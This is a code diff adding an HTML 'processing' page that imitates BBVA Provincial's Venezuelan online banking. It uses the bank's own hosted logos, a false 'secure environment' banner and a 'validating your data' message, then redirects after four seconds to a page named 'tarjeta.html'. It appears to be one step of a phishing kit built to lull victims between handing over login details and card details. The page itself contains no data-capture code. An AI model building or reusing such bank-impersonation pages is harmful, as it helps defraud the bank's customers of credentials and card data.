@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge; chrome=1"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
+    <title>BBVA Provincial - Procesando</title>
+
+    <link rel="stylesheet" href="fbin/css/fonts/fonts.css">
+    <link rel="stylesheet" href="fbin/css/style.css">
+    <link rel="stylesheet" href="fbin/css/header.css">
+    <link rel="stylesheet" href="fbin/css/login.css">
+    <link rel="stylesheet" href="fbin/css/footer.css">
+    <link rel="stylesheet" href="fbin/css/fontawesome.min.css">
+
+    <style>
+        /* Estilos centrados para la animación de carga */
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 20px;
+            text-align: center;
+            min-height: 300px;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(0, 51, 102, 0.1);
+            border-top-color: #004481; /* Color azul institucional BBVA */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--bbva-blue-dark, #070E46);
+            font-family: 'TiempoHeadline_Bold', Helvetica, Arial, sans-serif;
+            margin-bottom: 10px;
+        }
+        .loading-text {
+            font-size: 16px;
+            color: #555555;
+            font-family: 'BentonSansBBVA_Book', Helvetica, Arial, sans-serif;
+        }
+        .main-footer {
+        margin-top: 15vh !important; 
+    }
+    .main-content {
+        margin-top: 15vh !important; 
+    }
+    </style>
+</head>
+<body class="login">
+    <header class="header">
+        <div class="header-content container">
+            <div class="logo">
+                <div class="logo-placeholder">
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/logo-bbva.svg" alt="" class="headerLogo"/>
+                </div>
+            </div>
+            <nav class="header-nav">
+                <a href="#" class="nav-link" style="font-size: 20px">Acceso a Provinet Personas</a>
+                <a href="#" class="nav-link bbva-link">Ir a BBVA Provincial</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="main-content" style="margin-top: 50px;">
+        <div class="breadcrumb-notice">
+            <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/lock.svg" class="icono-lock" alt="">
+            <span class="txtSeg">Estás en un entorno con seguridad BBVA Provincial</span>
+        </div>
+
+        <div class="container" id="container2">
+            <div class="access-area">
+                <div id="form-column2" class="form-column" style="width: 100%;">
+                    
+                    <!-- Pantalla de Carga Intermedia -->
+                    <div class="loading-container">
+                        <div class="spinner"></div>
+                        <h1 class="loading-title">Procesando solicitud</h1>
+                        <p class="loading-text">Por favor, espere un momento mientras validamos sus datos...</p>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </main>
+
+<footer class="main-footer" style="margin-top: 50px;">
+    <div class="footer-content">
+        <!-- Logo y Redes Sociales -->
+        <div class="footer-header">
+            <div class="footer-logo">
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/logo-bbva-blanco.svg" alt="BBVA Logo"/>
+            </div>
+            <div class="social-links">
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/facebook.svg" 
+                     class="icono30" 
+                     onclick="window.open('https://www.facebook.com/BBVAProvincial.Venezuela', '_blank');"
+                     alt="Facebook"/>
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/twitter.svg" 
+                     class="icono30" 
+                     onclick="window.open('https://twitter.com/bbvaprovincial', '_blank');"
+                     alt="Twitter"/>
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/instagram.svg" 
+                     class="icono30" 
+                     onclick="window.open('https://www.instagram.com/bbvavenezuela', '_blank');"
+                     alt="Instagram"/>
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/linked-in.svg" 
+                     class="icono30" 
+                     onclick="window.open('https://ve.linkedin.com/company/bbva-banco-provincial', '_blank');"
+                     alt="LinkedIn"/>
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/youtube.svg" 
+                     class="icono30" 
+                     onclick="window.open('https://www.youtube.com/user/venezuelabbva?feature=mhsn', '_blank');"
+                     alt="YouTube"/>
+            </div>
+        </div>
+
+        <!-- Copyright -->
+        <div class="footer-copyright">
+            &#169;2026 BBVA Provincial S.A.
+        </div>
+        
+		<div class="footer-copyright-mobile">
+            &#169;2026 BBVA Provincial S.A. RIF: <br> J-00002967-9
+        </div>
+    </div>
+</footer>
+
+    <!-- Script para redirigir automáticamente después de unos segundos -->
+    <script>
+        setTimeout(function() {
+            // Cambia 'siguiente_pagina.php' por la ruta a donde quieres que pase despues
+            window.location.href = "tarjeta.html"; 
+        }, 4000); // 4000 milisegundos = 4 segundos (ajústalo a tu gusto)
+    </script>
+</body>
+</html>
